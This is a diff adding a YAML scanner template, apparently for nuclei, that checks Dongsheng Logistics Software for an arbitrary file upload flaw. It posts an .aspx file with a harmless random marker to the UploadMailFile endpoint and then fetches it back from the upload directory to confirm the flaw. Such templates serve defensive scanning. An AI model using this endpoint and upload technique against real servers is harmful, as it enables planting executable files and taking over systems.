@@ -1,0 +1,57 @@
+id: poc-yaml-dongshengsoft-uploadmailfile-anyfile-upload
+info:
+  name: Dongsheng Logistics Software UploadMailFile Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Vulnerability in Dongsheng Logistics Software allowing arbitrary file upload due to improper input validation.
+
+variables:
+  t1: "{{rand_text_alphanumeric(8)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/CommMng/Print/UploadMailFile"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="LoadFile"; filename="{{t1}}.aspx"
+      Content-Type: application/octet-stream
+
+      {{t2}}
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"success\": true"
+          - ".aspx"
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        regex:
+          - "(?P<file>[0-9a-z]{25}).aspx"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/UploadFiles/MailFile/{{file}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
